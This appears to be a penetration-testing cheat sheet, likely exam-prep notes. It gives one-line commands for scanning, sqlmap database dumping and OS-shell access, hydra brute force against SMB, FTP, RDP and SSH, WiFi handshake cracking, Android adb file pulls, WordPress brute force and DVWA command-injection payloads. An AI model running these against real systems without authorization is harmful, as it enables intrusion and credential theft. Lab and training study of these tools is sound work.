

### Sharing Files (Windows ↔ Linux)

Start HTTP server (common):
```bash
python3 -m http.server 8080
````

Download on Windows:

```powershell
Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg
```

Download on Linux:

```bash
wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg
```


### Finding Files

Works on Linux and Windows:

```bash
tree
```

Linux only:

```bash
sudo find / -name *.txt
```

```bash
sudo find / -name SpecificFileName.txt
```

```bash
sudo find /DirectoryName -name SpecificFileName.txt
```

```bash
sudo find . -name SpecificFileName.txt
```


### Mobile Device

Check for port `5555` open:

```bash
adb connect <TIP>:5555
```

```bash
adb pull sdcard/
```

```bash
python3 phonesploitpro.py
```

Interactive mode:

- `N` → next page
- `P` → previous page


### Server Identification

Aggressive scan:

```bash
nmap -A -oN scan.txt <TIP>
```

Use `mousepad` for easy searching.



### Domain Controller Identification

Check for open ports:

- `88/TCP` Kerberos
- `389/TCP` LDAP

If found, run aggressive scan for full DC details.



### Vulnerability Scanning

Nmap vulnerability scan:

```bash
nmap -Pn --script vuln <TIP> -T5
```

Alternative if nmap fails:

- `openVAS`


### SQL Injection

Tool:

```bash
sqlmap
```

Get cookie:

```javascript
document.cookie
```


### Hash Cracking

Offline tools:

```text
hashcat
john
```

Online tools can also be used.


### DVWA Command Execution

Windows:

```cmd
| type "path"
```

Linux:

```bash
| cat "path"
```


### WiFi (.cap) Cracking

Crack handshake:

```bash
aircrack-ng -w wordlist.txt capture.cap
```

```bash
aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap
```

Find BSSID from capture file:

```bash
aircrack-ng <filename>.cap
```


### Directory and Vulnerability Research

```bash
dirb <targetDomain> -x eg.txt
```


## Malware Analysis

RAT access:

```text
Theef → Client210.exe
```

Target ports:

```text
9871, 6703
```

Entry point and linker info:

```text
PEiD
```

Entropy analysis:

```text
Windows: DIE
Linux: ent
```


## Wireshark

SYN flood / DoS detection:

```wireshark
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

```wireshark
tcp.flags.syn == 1
```

Frame content search:

```wireshark
frame contains "string"
```

MQTT traffic:

```wireshark
mqtt
```

Statistics:

- `Statistics → Conversations`
- `Statistics → I/O Graphs`


## PE Analysis

Entry point address:

```text
PE Explorer
```

Cross-check:

```text
DIE → PE
PEiD
```


## Remote Login Ports

```text
22  → SSH
23  → Telnet
3389 → RDP
```


## SMB

Crack credentials:

```bash
hydra -L users.txt -P pass.txt <TIP> smb -f
```

List shares:

```bash
smbmap -H <TIP>
```

```bash
smbclient -L <TIP>
```

Access share:

```bash
smbclient //<TIP>/directory
```

Download file:

```bash
get <FileName>
```


## SSH

Login:

```bash
ssh user@<IP>
```

Privilege escalation:

```bash
sudo -i
```

Reference:

```text
https://gtfobins.github.io/
```


## FTP

```bash
ftp <IP>
```


## RDP

CLI:

```bash
xfreerdp /v:<TIP> /u:username
```

GUI:

```text
remmina
```


## Hydra Examples

FTP:

```bash
hydra -L users.txt -P passwords.txt ftp://<TIP> -f
```

RDP:

```bash
hydra -L users.txt -P passwords.txt rdp://<TIP> -f
```

SSH on custom port:

```bash
hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f
```


## Encryption and Steganography

CryptoForge encrypted files:

```text
.cfe
```

CRC32:

```text
HashMyFiles.exe
```

Steganography tools:

```text
OpenStego
steghide
```


## Base64

Decode string:

```bash
echo "aGVsbG8=" | base64 --decode
```

```bash
echo "aGVsbG8=" | base64 --d
```

Decode file:

```bash
base64 -d Sniff.txt > secret.txt
cat secret.txt
```


## Hashing

Windows:

```text
HashMyFiles
```

Linux:

```bash
sha256sum test.txt
```

```bash
algorithmsum <file>
```


## SQLmap Full Flow

```bash
sqlmap -u <url> --cookie <cookie_value> --dbs
```

```bash
sqlmap -u <url> --cookie <cookie_value> -D dbName --tables
```

```bash
sqlmap -u <url> --cookie <cookie_value> -D dbName -T Users_Login --dump
```

```bash
sqlmap -u <url> --cookie <cookie> --os-shell
```


## WordPress

Scan:

```bash
wpscan -url <domain_or_ip>
```

Bruteforce:

```bash
wpscan -url <domain_or_ip> -U user -P pass.txt
```

Enumerate users:

```bash
wpscan -url <domain_or_ip> -e u
```
